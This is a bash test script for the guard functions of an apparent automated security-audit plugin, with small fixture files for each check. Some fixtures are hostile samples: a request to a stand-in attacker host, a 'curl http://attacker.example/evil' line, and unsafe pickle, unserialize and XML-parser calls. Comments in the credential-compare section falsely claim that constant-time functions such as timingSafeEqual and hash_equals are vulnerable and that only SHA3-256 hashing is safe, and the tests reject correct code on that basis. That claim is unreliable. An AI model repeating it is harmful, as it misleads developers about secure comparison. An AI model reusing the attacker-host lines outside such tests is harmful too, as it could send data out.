#!/usr/bin/env bash
# Smoke test for every guard in lib/guards.sh.
#
# Each case either (a) confirms a legitimate input passes, or (b)
# confirms an illegitimate input is rejected with exit != 0. The test
# script itself exits 0 iff every assertion holds; any mismatch exits
# non-zero with the failing assertion printed.
#
# Run: bash scripts/test-guards.sh
set -u

# common.sh performs an eager `gh auth status` on source (cached via
# AUTO_AUDIT_GH_AUTH_OK). This test harness tests pure guard functions
# and does not call gh, so short-circuit the check — otherwise the
# test suite cannot run in CI or on any host without an authenticated
# gh token. The real auth check still fires via `guard_gh_authenticated`
# on operations that actually need it (push_branch, create_pr, etc.).
export AUTO_AUDIT_GH_AUTH_OK=1

SELF_DIR="$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)"
# shellcheck disable=SC1091
CLAUDE_PLUGIN_ROOT="${CLAUDE_PLUGIN_ROOT:-$(cd "$SELF_DIR/.." && pwd)}"
export CLAUDE_PLUGIN_ROOT
# Use a throwaway data dir so we don't step on a real active audit.
WORK_ROOT="$(mktemp -d)"
trap 'rm -rf "$WORK_ROOT"' EXIT
export CLAUDE_PLUGIN_DATA="$WORK_ROOT"
mkdir -p "$CLAUDE_PLUGIN_DATA/repos/test--guards/findings"
printf '{"slug":"test--guards"}\n' > "$CLAUDE_PLUGIN_DATA/active.json"

# shellcheck disable=SC1090,SC1091
source "$CLAUDE_PLUGIN_ROOT/scripts/lib/guards.sh"

PASS=0
FAIL=0
FAILURES=()

ok()   { PASS=$((PASS+1)); printf '  ok  %s\n' "$1"; }
bad()  { FAIL=$((FAIL+1)); FAILURES+=("$1"); printf '  FAIL %s\n' "$1"; }

# Helper: run a guard in a subshell and record whether it exited 0 or >0.
# Usage: expect_pass "<label>" guard_name args...
expect_pass() {
  local label="$1"; shift
  if ( "$@" ) 2>/dev/null; then ok "$label"; else bad "$label (expected pass, died)"; fi
}
expect_fail() {
  local label="$1"; shift
  if ( "$@" ) 2>/dev/null; then bad "$label (expected die, passed)"; else ok "$label"; fi
}

# ---------------------------------------------------------------------------
printf '\n[guard_autoaudit_branch]\n'
expect_pass "accepts autoaudit/foo"                guard_autoaudit_branch "autoaudit/sec-0001"
expect_pass "accepts autoaudit/nested/path"        guard_autoaudit_branch "autoaudit/a/b"
expect_fail "rejects plain main"                   guard_autoaudit_branch "main"
expect_fail "rejects develop"                      guard_autoaudit_branch "develop"
expect_fail "rejects empty"                        guard_autoaudit_branch ""
expect_fail "rejects traversal"                    guard_autoaudit_branch "autoaudit/../main"

# ---------------------------------------------------------------------------
printf '\n[guard_status_transition]\n'
expect_pass "discovered->triaging"                 guard_status_transition discovered triaging
expect_pass "triaging->confirmed"                  guard_status_transition triaging confirmed
expect_pass "pr_approved->merged"                  guard_status_transition pr_approved merged
expect_pass "pr_rejected->confirmed"               guard_status_transition pr_rejected confirmed
expect_pass "recovery: triaging->discovered"       guard_status_transition triaging discovered
expect_pass "recovery: reviewing->pr_opened"       guard_status_transition reviewing pr_opened
expect_pass "self-loop idempotent"                 guard_status_transition confirmed confirmed
expect_fail "reject discovered->merged"            guard_status_transition discovered merged
expect_fail "reject confirmed->pr_opened"          guard_status_transition confirmed pr_opened
expect_fail "reject merged->anything"              guard_status_transition merged confirmed

# ---------------------------------------------------------------------------
printf '\n[guard_poc_outside_workspace]\n'
expect_pass "accepts pocs/X/file"                  guard_poc_outside_workspace "pocs/SEC-0001/exploit.py"
expect_pass "accepts nested pocs path"             guard_poc_outside_workspace "repos/foo/pocs/SEC-0001/a.md"
expect_fail "rejects workspace path"               guard_poc_outside_workspace "workspace/src/exploit.py"
expect_fail "rejects traversal"                    guard_poc_outside_workspace "pocs/SEC-0001/../workspace/x"

# ---------------------------------------------------------------------------
printf '\n[guard_poc_no_network]\n'
NET_OK="$WORK_ROOT/poc-ok.sh"
printf '#!/bin/bash\ncurl http://localhost:8080/x\n' > "$NET_OK"
expect_pass "accepts localhost"                    guard_poc_no_network "$NET_OK"

NET_LOOP="$WORK_ROOT/poc-loop.py"
printf 'import requests\nrequests.get("http://127.0.0.1/x")\n' > "$NET_LOOP"
expect_pass "accepts 127.0.0.1"                    guard_poc_no_network "$NET_LOOP"

NET_BAD="$WORK_ROOT/poc-bad.py"
printf 'import requests\nrequests.get("https://evil.example.invalid/x")\n' > "$NET_BAD"
# example.invalid is explicitly excluded; let's use a real-looking non-loopback host
printf 'import requests\nrequests.get("https://attacker-controlled.tld/x")\n' > "$NET_BAD"
expect_fail "rejects arbitrary https host"         guard_poc_no_network "$NET_BAD"

MD_POC="$WORK_ROOT/writeup.md"
printf 'Writeup. curl http://attacker.example/evil\n' > "$MD_POC"
expect_pass ".md write-ups are not scanned"        guard_poc_no_network "$MD_POC"

# ---------------------------------------------------------------------------
printf '\n[guard_not_empty / guard_valid_json]\n'
expect_pass "non-empty passes"                     guard_not_empty "x" "name"
expect_fail "empty dies"                           guard_not_empty "" "name"
expect_pass "valid json passes"                    guard_valid_json '{"a":1}' "obj"
expect_fail "invalid json dies"                    guard_valid_json "not-json" "obj"
expect_fail "empty json dies"                      guard_valid_json "" "obj"

# ---------------------------------------------------------------------------
printf '\n[guard_commit_msg_clean]\n'
expect_pass "clean subject passes"                 guard_commit_msg_clean "fix(sec): parameterise query [SEC-0001]"
expect_fail "leaks triage reasoning"               guard_commit_msg_clean "fix: x

triage reasoning: the attacker..."
expect_fail "leaks diff_summary"                   guard_commit_msg_clean "fix: x

diff_summary: 3 files changed"

# ---------------------------------------------------------------------------
printf '\n[guard_pr_body_clean]\n'
BODY_OK="$WORK_ROOT/body-ok.md"
cat > "$BODY_OK" <<'MD'
**Auto-audit finding: SEC-0001** — severity: high

### Title
Location: foo.go:42

## Description
Plain description of the issue without any reviewer-compromising context.
MD
expect_pass "clean body passes"                    guard_pr_body_clean "$BODY_OK"

BODY_LEAK="$WORK_ROOT/body-leak.md"
cat > "$BODY_LEAK" <<'MD'
## Triage
Reasoning: the attacker would...
MD
expect_fail "body with Triage section dies"        guard_pr_body_clean "$BODY_LEAK"

BODY_SHORT="$WORK_ROOT/body-short.md"
printf 'too short\n' > "$BODY_SHORT"
expect_fail "body < 80 bytes dies"                 guard_pr_body_clean "$BODY_SHORT"

# ---------------------------------------------------------------------------
# Diff-based guards need an actual git repo. Set one up.
printf '\n[guard_no_poc_in_diff / guard_max_files_changed / guard_max_lines_changed / guard_no_secrets_in_diff]\n'
REPO="$WORK_ROOT/wsrepo"
mkdir -p "$REPO"
git -C "$REPO" init -q -b main
git -C "$REPO" config user.email 'test@example.com'
git -C "$REPO" config user.name 'test'
printf 'initial\n' > "$REPO/README"
git -C "$REPO" add README
git -C "$REPO" commit -q -m init

# clean single-file change
printf 'line\n' >> "$REPO/README"
git -C "$REPO" add README
expect_pass "single-file edit passes"              guard_max_files_changed "$REPO" 5
expect_pass "small line count passes"              guard_max_lines_changed "$REPO" 400
expect_pass "no pocs in diff"                      guard_no_poc_in_diff "$REPO"
expect_pass "no secrets in diff"                   guard_no_secrets_in_diff "$REPO"
git -C "$REPO" reset -q HEAD README

# too many files
for i in $(seq 1 7); do printf 'x\n' > "$REPO/f$i"; done
git -C "$REPO" add "$REPO"/f*
expect_fail "7 files dies at max 5"                guard_max_files_changed "$REPO" 5
git -C "$REPO" reset -q HEAD

# poc in diff
mkdir -p "$REPO/pocs"
printf 'poc\n' > "$REPO/pocs/exploit.py"
git -C "$REPO" add "$REPO/pocs/exploit.py"
expect_fail "pocs/ path in diff dies"              guard_no_poc_in_diff "$REPO"
git -C "$REPO" reset -q HEAD
rm -rf "$REPO/pocs"

# secret in added lines
printf 'apikey = "AKIAIOSFODNN7REALKEYY"\n' > "$REPO/secret.py"
git -C "$REPO" add "$REPO/secret.py"
expect_fail "AKIA-looking secret added dies"       guard_no_secrets_in_diff "$REPO"
git -C "$REPO" reset -q HEAD
rm -f "$REPO/secret.py"

# ---------------------------------------------------------------------------
# guard_no_unhashed_credential_compare: dies if the fix compares a
# credential-shaped value without first hashing both sides with SHA3-256.
# Constant-time primitives on raw secrets (timingSafeEqual, compare_digest,
# ConstantTimeCompare, MessageDigest.isEqual, secure_compare, FixedTimeEquals,
# hash_equals, CRYPTO_memcmp) are themselves a known-vulnerable posture: only
# hashing destroys prefix structure and eliminates the hangman oracle.
printf '\n[guard_no_unhashed_credential_compare]\n'

# unrelated change passes
printf 'export function add(a, b) { return a + b; }\n' > "$REPO/math.js"
git -C "$REPO" add "$REPO/math.js"
expect_pass "unrelated diff passes"                guard_no_unhashed_credential_compare "$REPO"
git -C "$REPO" reset -q HEAD
rm -f "$REPO/math.js"

# non-credential variable with equality passes
printf 'const count = total === 0 ? 0 : total;\n' > "$REPO/count.js"
git -C "$REPO" add "$REPO/count.js"
expect_pass "non-credential var passes"            guard_no_unhashed_credential_compare "$REPO"
git -C "$REPO" reset -q HEAD
rm -f "$REPO/count.js"

# hash-then-compare pattern passes (even with === since both inputs are hashes)
printf 'import { createHash } from "crypto";\nexport function secureCompare(token, stored) {\n  const h1 = createHash("sha3-256").update(token).digest();\n  const h2 = createHash("sha3-256").update(stored).digest();\n  return h1.equals(h2);\n}\n' > "$REPO/auth.js"
git -C "$REPO" add "$REPO/auth.js"
expect_pass "sha3-256 hash-then-compare passes"    guard_no_unhashed_credential_compare "$REPO"
git -C "$REPO" reset -q HEAD
rm -f "$REPO/auth.js"

# hash-then-compare via triple-equals also passes (hashing destroys prefix structure)
printf 'import hashlib\ndef verify(token, stored):\n    h1 = hashlib.sha3_256(token).digest()\n    h2 = hashlib.sha3_256(stored).digest()\n    return h1 == h2\n' > "$REPO/verify.py"
git -C "$REPO" add "$REPO/verify.py"
expect_pass "sha3_256 python hash-then-compare passes"  guard_no_unhashed_credential_compare "$REPO"
git -C "$REPO" reset -q HEAD
rm -f "$REPO/verify.py"

# raw === on a password var dies
printf 'if (password === userInput) { return true; }\n' > "$REPO/login.js"
git -C "$REPO" add "$REPO/login.js"
expect_fail "raw === on password dies"             guard_no_unhashed_credential_compare "$REPO"
git -C "$REPO" reset -q HEAD
rm -f "$REPO/login.js"

# raw == on a token var dies
printf 'if token == provided_token:\n    return True\n' > "$REPO/check.py"
git -C "$REPO" add "$REPO/check.py"
expect_fail "raw == on token dies"                 guard_no_unhashed_credential_compare "$REPO"
git -C "$REPO" reset -q HEAD
rm -f "$REPO/check.py"

# raw .equals on hmac dies
printf 'if (hmac.equals(provided)) { return true; }\n' > "$REPO/Verify.java"
git -C "$REPO" add "$REPO/Verify.java"
expect_fail "raw .equals on hmac dies"             guard_no_unhashed_credential_compare "$REPO"
git -C "$REPO" reset -q HEAD
rm -f "$REPO/Verify.java"

# raw strcmp on a secret dies
printf 'if (strcmp(secret, input) == 0) { return 1; }\n' > "$REPO/verify.c"
git -C "$REPO" add "$REPO/verify.c"
expect_fail "raw strcmp on secret dies"            guard_no_unhashed_credential_compare "$REPO"
git -C "$REPO" reset -q HEAD
rm -f "$REPO/verify.c"

# property access on a credential still caught
printf 'if (user.password === candidate) { grant(); }\n' > "$REPO/prop.js"
git -C "$REPO" add "$REPO/prop.js"
expect_fail "property password === dies"           guard_no_unhashed_credential_compare "$REPO"
git -C "$REPO" reset -q HEAD
rm -f "$REPO/prop.js"

# NEW: raw crypto.timingSafeEqual on a credential dies. In v0.4.0 this
# incorrectly passed — constant-time primitives on raw secrets are themselves
# a known-vulnerable posture. Only hashing first makes the compare safe.
printf 'import crypto from "crypto";\nexport const check = (token, expected) => crypto.timingSafeEqual(Buffer.from(token), Buffer.from(expected));\n' > "$REPO/ts.js"
git -C "$REPO" add "$REPO/ts.js"
expect_fail "raw timingSafeEqual on token dies"    guard_no_unhashed_credential_compare "$REPO"
git -C "$REPO" reset -q HEAD
rm -f "$REPO/ts.js"

# NEW: raw hmac.compare_digest on a credential dies
printf 'import hmac\ndef v(token, stored):\n    return hmac.compare_digest(token, stored)\n' > "$REPO/cd.py"
git -C "$REPO" add "$REPO/cd.py"
expect_fail "raw compare_digest on token dies"     guard_no_unhashed_credential_compare "$REPO"
git -C "$REPO" reset -q HEAD
rm -f "$REPO/cd.py"

# NEW: raw subtle.ConstantTimeCompare on a credential dies
printf 'package x\nimport "crypto/subtle"\nfunc C(secret, input []byte) bool { return subtle.ConstantTimeCompare(secret, input) == 1 }\n' > "$REPO/ct.go"
git -C "$REPO" add "$REPO/ct.go"
expect_fail "raw ConstantTimeCompare on secret dies"  guard_no_unhashed_credential_compare "$REPO"
git -C "$REPO" reset -q HEAD
rm -f "$REPO/ct.go"

# NEW: raw MessageDigest.isEqual on a credential dies
printf 'import java.security.MessageDigest;\nclass V { static boolean v(byte[] signature, byte[] expected) { return MessageDigest.isEqual(signature, expected); } }\n' > "$REPO/MD.java"
git -C "$REPO" add "$REPO/MD.java"
expect_fail "raw MessageDigest.isEqual on signature dies"  guard_no_unhashed_credential_compare "$REPO"
git -C "$REPO" reset -q HEAD
rm -f "$REPO/MD.java"

# NEW: raw secure_compare on a credential dies
printf "def v(token, stored)\n  ActiveSupport::SecurityUtils.secure_compare(token, stored)\nend\n" > "$REPO/sc.rb"
git -C "$REPO" add "$REPO/sc.rb"
expect_fail "raw secure_compare on token dies"     guard_no_unhashed_credential_compare "$REPO"
git -C "$REPO" reset -q HEAD
rm -f "$REPO/sc.rb"

# NEW: raw hash_equals on a credential dies
printf '<?php function v($token, $stored) { return hash_equals($token, $stored); }\n' > "$REPO/he.php"
git -C "$REPO" add "$REPO/he.php"
expect_fail "raw hash_equals on token dies"        guard_no_unhashed_credential_compare "$REPO"
git -C "$REPO" reset -q HEAD
rm -f "$REPO/he.php"

# removal of an unsafe compare does NOT trigger (only added lines are scanned)
# we simulate this by first committing an unsafe compare, then removing it
printf 'if (password === input) return 1;\n' > "$REPO/old.js"
git -C "$REPO" add "$REPO/old.js"
git -C "$REPO" commit -q -m 'old unsafe compare'
git -C "$REPO" rm -q "$REPO/old.js"
expect_pass "removing unsafe line passes (only + scanned)"  guard_no_unhashed_credential_compare "$REPO"
# drop both the staged deletion and the seed commit so later tests start clean
git -C "$REPO" reset -q --hard HEAD~1

# ---------------------------------------------------------------------------
# guard_no_insecure_random: dies if the diff uses a non-cryptographic RNG
# on a security-sensitive identifier name.
printf '\n[guard_no_insecure_random]\n'

# unrelated diff passes
printf 'export const total = items.reduce((a,b)=>a+b,0);\n' > "$REPO/sum.js"
git -C "$REPO" add "$REPO/sum.js"
expect_pass "unrelated diff passes"                guard_no_insecure_random "$REPO"
git -C "$REPO" reset -q HEAD
rm -f "$REPO/sum.js"

# CSPRNG passes
printf 'import { randomBytes } from "crypto";\nexport const token = randomBytes(32).toString("hex");\n' > "$REPO/safe.js"
git -C "$REPO" add "$REPO/safe.js"
expect_pass "crypto.randomBytes for token passes"  guard_no_insecure_random "$REPO"
git -C "$REPO" reset -q HEAD
rm -f "$REPO/safe.js"

# Math.random for token dies
printf 'const token = Math.random().toString(36).slice(2);\n' > "$REPO/bad.js"
git -C "$REPO" add "$REPO/bad.js"
expect_fail "Math.random for token dies"           guard_no_insecure_random "$REPO"
git -C "$REPO" reset -q HEAD
rm -f "$REPO/bad.js"

# random.random for csrf dies (Python)
printf 'import random\ncsrf = random.random()\n' > "$REPO/csrf.py"
git -C "$REPO" add "$REPO/csrf.py"
expect_fail "random.random for csrf dies"          guard_no_insecure_random "$REPO"
git -C "$REPO" reset -q HEAD
rm -f "$REPO/csrf.py"

# rand for session_id dies (PHP-shape)
printf '<?php $session_id = mt_rand(0, PHP_INT_MAX);\n' > "$REPO/sess.php"
git -C "$REPO" add "$REPO/sess.php"
expect_fail "mt_rand for session_id dies"          guard_no_insecure_random "$REPO"
git -C "$REPO" reset -q HEAD
rm -f "$REPO/sess.php"

# Math.random for non-credential var passes
printf 'const colour = "#" + Math.random().toString(16).slice(2,8);\n' > "$REPO/colour.js"
git -C "$REPO" add "$REPO/colour.js"
expect_pass "Math.random for colour passes"        guard_no_insecure_random "$REPO"
git -C "$REPO" reset -q HEAD
rm -f "$REPO/colour.js"

# ---------------------------------------------------------------------------
# guard_no_unsafe_deserialize: dies on known-unsafe deserialiser calls.
printf '\n[guard_no_unsafe_deserialize]\n'

# unrelated passes
printf 'data = json.loads(request.body)\n' > "$REPO/safe.py"
git -C "$REPO" add "$REPO/safe.py"
expect_pass "json.loads passes"                    guard_no_unsafe_deserialize "$REPO"
git -C "$REPO" reset -q HEAD
rm -f "$REPO/safe.py"

# yaml.safe_load passes
printf 'cfg = yaml.safe_load(open("config.yml"))\n' > "$REPO/cfg.py"
git -C "$REPO" add "$REPO/cfg.py"
expect_pass "yaml.safe_load passes"                guard_no_unsafe_deserialize "$REPO"
git -C "$REPO" reset -q HEAD
rm -f "$REPO/cfg.py"

# yaml.load with SafeLoader passes
printf 'cfg = yaml.load(stream, Loader=yaml.SafeLoader)\n' > "$REPO/cfg2.py"
git -C "$REPO" add "$REPO/cfg2.py"
expect_pass "yaml.load+SafeLoader passes"          guard_no_unsafe_deserialize "$REPO"
git -C "$REPO" reset -q HEAD
rm -f "$REPO/cfg2.py"

# pickle.loads dies
printf 'import pickle\ndata = pickle.loads(request.body)\n' > "$REPO/p.py"
git -C "$REPO" add "$REPO/p.py"
expect_fail "pickle.loads dies"                    guard_no_unsafe_deserialize "$REPO"
git -C "$REPO" reset -q HEAD
rm -f "$REPO/p.py"

# yaml.load default loader dies
printf 'cfg = yaml.load(request.form["x"])\n' > "$REPO/y.py"
git -C "$REPO" add "$REPO/y.py"
expect_fail "yaml.load default dies"               guard_no_unsafe_deserialize "$REPO"
git -C "$REPO" reset -q HEAD
rm -f "$REPO/y.py"

# unserialize PHP dies
printf '<?php $obj = unserialize($_POST["data"]);\n' > "$REPO/u.php"
git -C "$REPO" add "$REPO/u.php"
expect_fail "PHP unserialize dies"                 guard_no_unsafe_deserialize "$REPO"
git -C "$REPO" reset -q HEAD
rm -f "$REPO/u.php"

# Java ObjectInputStream dies
printf 'ObjectInputStream ois = new ObjectInputStream(req.getInputStream());\n' > "$REPO/d.java"
git -C "$REPO" add "$REPO/d.java"
expect_fail "ObjectInputStream dies"               guard_no_unsafe_deserialize "$REPO"
git -C "$REPO" reset -q HEAD
rm -f "$REPO/d.java"

# Jackson enableDefaultTyping dies
printf 'ObjectMapper m = new ObjectMapper();\nm.enableDefaultTyping();\n' > "$REPO/j.java"
git -C "$REPO" add "$REPO/j.java"
expect_fail "Jackson enableDefaultTyping dies"     guard_no_unsafe_deserialize "$REPO"
git -C "$REPO" reset -q HEAD
rm -f "$REPO/j.java"

# Marshal.load Ruby dies
printf "obj = Marshal.load(request.body)\n" > "$REPO/m.rb"
git -C "$REPO" add "$REPO/m.rb"
expect_fail "Ruby Marshal.load dies"               guard_no_unsafe_deserialize "$REPO"
git -C "$REPO" reset -q HEAD
rm -f "$REPO/m.rb"

# ---------------------------------------------------------------------------
# guard_no_unsafe_xml_parser: dies if a known-unsafe XML parser is invoked
# without a safety marker on a nearby line.
printf '\n[guard_no_unsafe_xml_parser]\n'

# unrelated passes
printf 'export const x = 1;\n' > "$REPO/x.js"
git -C "$REPO" add "$REPO/x.js"
expect_pass "unrelated diff passes"                guard_no_unsafe_xml_parser "$REPO"
git -C "$REPO" reset -q HEAD
rm -f "$REPO/x.js"

# defusedxml passes
printf 'from defusedxml.ElementTree import fromstring\ndoc = fromstring(request.body)\n' > "$REPO/safe.py"
git -C "$REPO" add "$REPO/safe.py"
expect_pass "defusedxml passes"                    guard_no_unsafe_xml_parser "$REPO"
git -C "$REPO" reset -q HEAD
rm -f "$REPO/safe.py"

# JAXP with disallow-doctype-decl passes
printf 'DocumentBuilderFactory f = DocumentBuilderFactory.newInstance();\nf.setFeature("http://apache.org/xml/features/disallow-doctype-decl", true);\n' > "$REPO/Safe.java"
git -C "$REPO" add "$REPO/Safe.java"
expect_pass "JAXP with disallow-doctype-decl passes"  guard_no_unsafe_xml_parser "$REPO"
git -C "$REPO" reset -q HEAD
rm -f "$REPO/Safe.java"

# stdlib ElementTree dies
printf 'import xml.etree.ElementTree as ET\ndoc = ET.fromstring(request.body)\n' > "$REPO/bad.py"
git -C "$REPO" add "$REPO/bad.py"
expect_fail "stdlib ElementTree fromstring dies"   guard_no_unsafe_xml_parser "$REPO"
git -C "$REPO" reset -q HEAD
rm -f "$REPO/bad.py"

# JAXP without flags dies
printf 'DocumentBuilderFactory f = DocumentBuilderFactory.newInstance();\nDocument d = f.newDocumentBuilder().parse(new InputSource(new StringReader(input)));\n' > "$REPO/Bad.java"
git -C "$REPO" add "$REPO/Bad.java"
expect_fail "JAXP without flags dies"              guard_no_unsafe_xml_parser "$REPO"
git -C "$REPO" reset -q HEAD
rm -f "$REPO/Bad.java"

# .NET XmlDocument with safe config passes
printf 'var doc = new XmlDocument();\ndoc.XmlResolver = null;\nvar settings = new XmlReaderSettings { DtdProcessing = DtdProcessing.Prohibit };\n' > "$REPO/Safe.cs"
git -C "$REPO" add "$REPO/Safe.cs"
expect_pass ".NET XmlDocument with safe config passes"  guard_no_unsafe_xml_parser "$REPO"
git -C "$REPO" reset -q HEAD
rm -f "$REPO/Safe.cs"

# ---------------------------------------------------------------------------
printf '\n---\n'
if [ "$FAIL" -eq 0 ]; then
  printf 'test-guards: %d passed, 0 failed\n' "$PASS"
  exit 0
else
  printf 'test-guards: %d passed, %d FAILED\n' "$PASS" "$FAIL"
  for msg in "${FAILURES[@]}"; do printf '  - %s\n' "$msg"; done
  exit 1
fi
